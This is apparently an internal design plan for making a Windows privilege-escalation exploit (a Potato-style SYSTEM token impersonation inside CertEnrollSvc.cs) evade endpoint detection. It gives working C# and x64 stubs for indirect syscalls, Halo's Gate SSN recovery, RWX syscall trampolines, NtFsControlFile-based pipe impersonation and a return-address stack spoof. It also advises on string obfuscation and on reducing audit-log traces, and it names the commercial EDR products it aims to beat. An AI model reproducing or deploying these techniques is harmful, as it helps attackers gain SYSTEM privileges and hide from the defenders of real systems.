# Call Stack Evasion — Lightweight Alternatives

## Problem Statement

`CertEnrollSvc.cs` (managed CLR) calls `ImpersonateNamedPipeClient` and `CreateProcessAsUserW`
via delegates. When an EDR user-mode hook fires at the Win32 API entry point, it walks the
native return-address chain and finds CLR frames (`CertEnrollmentAgent` → `clr.dll` thunk).
No amount of delegate indirection hides this.

The previously drafted "native helper DLL + StackSpoofer" plan addressed this but introduced
larger problems: unsigned DLL drop to `%SystemRoot%\System32\` (write fails — AppPool has no
ACL), Sysmon Event 11 + 7 sideload chain, fresh DLL load triggering
`PspLoadImageNotifyRoutine`, etc. The cure was louder than the disease.

**Reframe:** EDR walks the stack only when a hook fires. **If no Win32 API hook fires, no
stack walk happens.** Direct syscall bypasses the hook entirely, removing the need to spoof
anything.

This document specifies three tiered alternatives, all of which fit inside `CertEnrollSvc.cs`
with no native build pipeline, no disk drop, single deploy artifact.

---

## Tier 1 — Indirect Syscall for `ImpersonateNamedPipeClient` (recommended)

### What it eliminates

`ImpersonateNamedPipeClient` is the strongest behavioral signal in the Potato chain. Service
account → `CreateNamedPipe` → LSASS connects → `ImpersonateNamedPipeClient` is a near-unique
fingerprint. Removing the Win32 API call removes the hook entry point.

The kernel-level operation behind `ImpersonateNamedPipeClient` is a single `NtFsControlFile`
call with `FSCTL_PIPE_IMPERSONATE`:

```
NtFsControlFile(hPipe, NULL, NULL, NULL, &iosb, 0x0011400C, NULL, 0, NULL, 0)
```

Calling this directly as an indirect syscall:
- No `advapi32!ImpersonateNamedPipeClient` frame on the stack
- No EDR hook at that Win32 API → no stack walk invoked
- Kernel-side impersonation happens the same way it would have

After the syscall, the impersonation token lives on the current thread. Retrieve it with
`NtOpenThreadToken` (also via indirect syscall).

### Architecture

```
CertEnrollSvc.exe  (C# managed)
│
│  CreateNamedPipe / ConnectNamedPipe / RPC trigger  (unchanged — pre-impersonation,
│                                                     hooks here are benign)
│
│  ┌─ class X: SyscallEngine ────────────────────────────┐
│  │  Walk PEB → ntdll base                              │
│  │  Find SSN(NtFsControlFile), SSN(NtOpenThreadToken)  │
│  │  Find "syscall; ret" gadget in ntdll!.text          │
│  │  AllocHGlobal(RWX), write trampolines               │
│  └─────────────────────────────────────────────────────┘
│
│  ► pfNtFsControlFile(hPipe, ..., FSCTL_PIPE_IMPERSONATE, ...)
│      └─ trampoline (RWX) → syscall gadget in ntdll → kernel
│
│  ► pfNtOpenThreadToken(NtCurrentThread, TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY,
│                        TRUE, &hToken)
│      └─ trampoline (RWX) → syscall gadget in ntdll → kernel
│
│  hToken now holds the SYSTEM impersonation token.
│
│  CreateProcessAsUserW(hToken, ..., &si, &pi)   ← Win32, unchanged
│      (signal weaker — CPAU is called by many legit services)
```

### Building the syscall engine in C#

Embed a single class inside `class X` (or a sibling `class Sx`). Steps it performs in
`Init()`:

**1. Locate ntdll**

```csharp
IntPtr hNt = X.G(X.S(X._ntdll));   // GetModuleHandleW("ntdll.dll")
```

`_ntdll` is a new XOR-encoded entry in class `X`.

**2. Read SSN from a Zw/Nt stub**

A standard ntdll Nt-prefixed export on Windows 10/11 x64 has the prologue:

```
4C 8B D1                  mov  r10, rcx
B8 XX XX 00 00            mov  eax, <SSN>
F6 04 25 08 03 FE 7F 01   test byte ptr [0x7FFE0308], 1
75 03                     jne  short +3
0F 05                     syscall
C3                        ret
CD 2E                     int  0x2E
C3                        ret
```

The 2-byte SSN is at offset +4 from the export address:

```csharp
ushort ReadSsn(IntPtr ntdllBase, byte[] hashedApiName) {
    IntPtr pStub = X.P(ntdllBase, X.S(hashedApiName));    // GetProcAddress
    return (ushort)Marshal.ReadInt16(pStub, 4);
}
```

If the prologue does not match (hooked or jumped), fall back to **Halo's Gate**: walk
neighbouring exports up/down by 0x20 bytes until an unhooked stub is found, derive SSN by
counting from there. Reuse the pattern from `CWLHerpaderping/syscall.h` — port the core
~40-line scan to C#.

**3. Locate `syscall; ret` gadget inside ntdll**

```csharp
IntPtr FindSyscallGadget(IntPtr ntdllBase) {
    // Walk PE headers: e_lfanew → IMAGE_NT_HEADERS → .text section
    // Scan for byte pattern 0F 05 C3
    // Return address of first match
}
```

This is ~30 lines using `Marshal.ReadInt32` / `Marshal.Copy`. The gadget lives in ntdll's
`.text` (MEM_IMAGE) so the actual `syscall` instruction is module-backed — kernel-side
"caller-from-ntdll" verification passes.

**4. Build trampolines**

For each `Nt*` API needed, allocate a small RWX buffer and write:

```
4C 8B D1                  mov  r10, rcx
B8 <SSN low> <SSN high> 00 00   mov  eax, SSN
49 BB <gadget 8 bytes>    mov  r11, <syscall_gadget>
41 FF E3                  jmp  r11
```

Total 19 bytes. In C#:

```csharp
IntPtr BuildTrampoline(ushort ssn, IntPtr gadget) {
    IntPtr buf = Marshal.AllocHGlobal(32);
    byte[] stub = new byte[] {
        0x4C, 0x8B, 0xD1,                                 // mov r10, rcx
        0xB8, (byte)ssn, (byte)(ssn >> 8), 0x00, 0x00,    // mov eax, ssn
        0x49, 0xBB, 0,0,0,0,0,0,0,0,                      // mov r11, gadget
        0x41, 0xFF, 0xE3                                  // jmp r11
    };
    Buffer.BlockCopy(BitConverter.GetBytes(gadget.ToInt64()), 0, stub, 10, 8);
    Marshal.Copy(stub, 0, buf, stub.Length);

    // Flip page to RX after write
    uint old;
    VirtualProtect(buf, (UIntPtr)stub.Length, 0x20 /*PAGE_EXECUTE_READ*/, out old);
    return buf;
}
```

`VirtualProtect` adds one IAT entry; alternatively resolve it via the existing class `X`
pattern to keep IAT minimal.

**5. Bind delegates**

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int D_NtFsControlFile(
    IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext,
    IntPtr IoStatusBlock, uint FsControlCode,
    IntPtr InputBuffer, uint InputBufferLength,
    IntPtr OutputBuffer, uint OutputBufferLength);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int D_NtOpenThreadToken(
    IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf,
    out IntPtr TokenHandle);

internal static D_NtFsControlFile pfNtFsControlFile;
internal static D_NtOpenThreadToken pfNtOpenThreadToken;

pfNtFsControlFile = (D_NtFsControlFile)Marshal.GetDelegateForFunctionPointer(
    BuildTrampoline(ssnFsCtl, gadget), typeof(D_NtFsControlFile));
pfNtOpenThreadToken = (D_NtOpenThreadToken)Marshal.GetDelegateForFunctionPointer(
    BuildTrampoline(ssnOpenThreadToken, gadget), typeof(D_NtOpenThreadToken));
```

### Replacing the impersonation block

```csharp
// IO_STATUS_BLOCK on stack
byte[] iosb = new byte[16];
GCHandle hIosb = GCHandle.Alloc(iosb, GCHandleType.Pinned);
try {
    const uint FSCTL_PIPE_IMPERSONATE = 0x0011400C;
    int status = X.pfNtFsControlFile(
        hChannel,            // hPipe
        IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
        hIosb.AddrOfPinnedObject(),
        FSCTL_PIPE_IMPERSONATE,
        IntPtr.Zero, 0, IntPtr.Zero, 0);

    if (status < 0) { /* error */ return; }

    IntPtr hToken;
    IntPtr hThread = new IntPtr(-2);  // NtCurrentThread
    const uint TOKEN_NEEDED = 0x0002 /*DUPLICATE*/ | 0x0001 /*ASSIGN_PRIMARY*/
                            | 0x0008 /*QUERY*/    | 0x0004 /*IMPERSONATE*/;
    status = X.pfNtOpenThreadToken(hThread, TOKEN_NEEDED, true, out hToken);
    if (status < 0) { /* error */ return; }

    // hToken is the SYSTEM impersonation token — proceed to CreateProcessAsUserW unchanged
    // (or duplicate to primary first via NtDuplicateToken / DuplicateTokenEx)
} finally {
    hIosb.Free();
}
```

Note `TOKEN_ALL_ACCESS` was previously suggested in §3.3 of the deleted plan; the trimmed
set above is what `CreateProcessAsUserW` actually requires and is less suspicious in
Security Event 4663 audit logs.

### Cost

- **+~250 lines C#** in `CertEnrollSvc.cs` (syscall engine + 2 delegate bindings + replaced
  impersonation block)
- **+1 IAT entry**: `VirtualProtect` (or resolve dynamically to keep current IAT clean)
- **+1 XOR string entry in `encode.py`**: `_ntdll` → `ntdll.dll`
- **0 new files, 0 build steps, 0 disk artifacts**

### Effectiveness

| Signal | Before | After Tier 1 |
|---|---|---|
| `advapi32!ImpersonateNamedPipeClient` hook | Fires, walks managed CLR stack | Never fires |
| `advapi32!CreateProcessAsUserW` hook | Fires, walks managed CLR stack | Still fires (acceptable — CPAU is high-volume in legit traffic) |
| User-mode Potato chain pattern (CreateNamedPipe + RPC + Impersonate) | Complete | Impersonate step invisible at user-mode |
| Security Event 4624 — impersonation logon | Logged | Logged (kernel audit, unavoidable) |
| ETW Threat Intelligence — syscall from non-ntdll caller | n/a | Logged if Defender ATP consumes channel (RWX trampoline at issue) |

The high-impact gain is eliminating the user-mode hook callback. The remaining ETW-TI
signal is consumed only by select EDR products (Defender for Endpoint, some
SentinelOne/CrowdStrike configurations) — not by static ML scanners.

---

## Tier 2 — Add `NtCreateUserProcess` Indirect Syscall

### What it eliminates

Removes the `advapi32!CreateProcessAsUserW` Win32 entry point. After Tier 1 + Tier 2, no
sensitive Win32 API is called user-mode at all during the impersonation → spawn sequence.

### Why it is expensive

`NtCreateUserProcess` is the native-level process creation primitive but its calling
convention is **significantly harder** than the Win32 wrapper:

- `PS_CREATE_INFO` (variable-length, multi-state union — state transitions during the call)
- `PS_ATTRIBUTE_LIST` (sequence of typed attributes — token, parent process, image name,
  client ID, mitigation policy)
- Image path must be in NT object namespace format (`\??\C:\Windows\System32\cmd.exe`),
  not Win32 path
- `RTL_USER_PROCESS_PARAMETERS` must be built and serialized (image path, command line,
  current directory, environment block, window title — all `UNICODE_STRING` structs)

Realistic cost: **~500-800 lines of C# struct marshalling** even with helpers. The PEB
parameter block alone is ~80 lines.

### Recommendation

**Skip Tier 2 unless detection telemetry after Tier 1 specifically flags `CreateProcessAsUserW`
as the surviving signal.** `CreateProcessAsUserW` is called by IIS, SCM, Task Scheduler,
service control manager, and dozens of legitimate components. Hook callbacks at this API
have very high false-positive rates, so EDR rules typically require correlation with another
signal (e.g., caller process attribute, token source). Removing Tier 1's signal usually
breaks that correlation already.

If Tier 2 is needed later, structure it as a separate module (`SyscallEngine.cs`) so it can
be added without rewriting Tier 1.

---

## Tier 3 — Inline Stack Spoof for `CreateProcessAsUserW` (alternative to Tier 2)

If `CreateProcessAsUserW` must remain callable but its stack must look clean, do a minimal
single-frame spoof inline in C# — no native DLL, no StackSpoofer port.

### Mechanism

Plant a return address that points to an epilogue gadget inside `kernel32.dll`. When the EDR
hook walks the return address chain, the first non-API frame above `CreateProcessAsUserW`
appears to be in kernel32 (MEM_IMAGE, signed module).

### Stub

```
; rcx, rdx, r8, r9 = first 4 args (already set by C# caller)
; remaining args on stack via Marshal P/Invoke
sub rsp, 0x28          ; shadow space
mov rax, <gadget>      ; epilogue inside kernel32 (e.g., final "add rsp,Xxh; ret")
mov [rsp+0x28], rax    ; overwrite return slot
mov rax, <CPAU>
jmp rax                ; tail-call CreateProcessAsUserW
```

When CPAU returns, it returns through the planted gadget. The gadget restores stack and
returns to our actual caller in the RWX trampoline → back into managed code.

### Gadget search

Walk `kernel32.dll!.text` for the byte pattern `48 83 C4 28 C3` (add rsp,28h; ret) or a
similar epilogue. ~20 lines C#. Cache the address.

### Caveats vs proper StackSpoofer

- **Single frame only.** EDR that walks more than 1 frame deep sees the trampoline (MEM_PRIVATE).
- **No unwind info fix-up.** EDRs that use `RtlVirtualUnwind` instead of naive return-address
  reading will fail to unwind past the planted gadget (no matching `RUNTIME_FUNCTION` entry
  for the chain) — which is itself a signal but a relatively weak one.
- **Sufficient for static ML scanners and 1-deep behavioral hooks.** Not sufficient for
  modern endpoint protection that does full unwind validation.

### Cost

~80 lines C# total: gadget search + trampoline builder + single delegate rebind for CPAU.

### When to choose Tier 3 over Tier 2

Choose Tier 3 if:
- Detection telemetry shows CPAU hook is fired and walking the stack
- Target EDR is one of the static-ML or first-pass behavioral products
- `PS_CREATE_INFO` complexity is not justified

Choose Tier 2 if:
- Target EDR does full `RtlVirtualUnwind` validation
- The exploit must remain undetected against tier-1 EDR (CS Falcon, MDE in audit mode with
  TI channel consumption)

---

## Recommended Implementation Order

1. **Tier 1 first.** Highest detection-impact-per-line-of-code. Largely self-contained.
2. **Measure.** Run the rebuilt `CertEnrollSvc.exe` against the lab's detection stack.
   Identify which signals survive.
3. **If `CreateProcessAsUserW` is the surviving signal:**
   - Static-ML / weak behavioral EDR → **Tier 3**
   - Modern endpoint EDR → **Tier 2**
4. **If a non-CPAU signal survives** (e.g., named-pipe creation pattern, RPC trigger,
   Security Event 4624) — stack spoofing does not help. That requires reworking the exploit
   primitive itself (different coercion vector, different impersonation path) and is out of
   scope for this document.

---

## Files to Modify

| Action | File |
|---|---|
| **Modify** | `CertEnrollSvc.cs` — add syscall engine helpers in class `X`, replace impersonation block |
| **Modify** | `encode.py` REGISTRY — add `_ntdll` → `ntdll.dll`; (Tier 1 needs only one new entry) |
| **Modify** | `README.md` Evasion Status table — track Tier 1/2/3 status separately |
| **Reuse** | `CWLHerpaderping/CWLHerpaderping/syscall.h` — reference only, port the Halo's Gate scan logic to C# (do not link) |

No new directories, no new executables, no native build pipeline.

---

## What This Does Not Defeat

Same as the deleted plan — kept here for completeness:

| Signal | Reason |
|---|---|
| Security Event 4624 — impersonation logon | Kernel audit, independent of user mode |
| Security Event 4688 — process creation | Kernel audit, independent of user mode |
| Named-pipe creation + LSASS connection pattern | Kernel ETW, intrinsic to exploit |
| CLR ETW events from `CertEnrollSvc.exe` | CLR profiler — managed code runs regardless |
| ETW-TI: syscall instruction from RWX page (trampoline) | Tier-1 EDR only; static ML does not consume this |

Stack-level evasion addresses **user-mode hook call stack inspection**. It does not address
kernel-originated audit or ETW events.
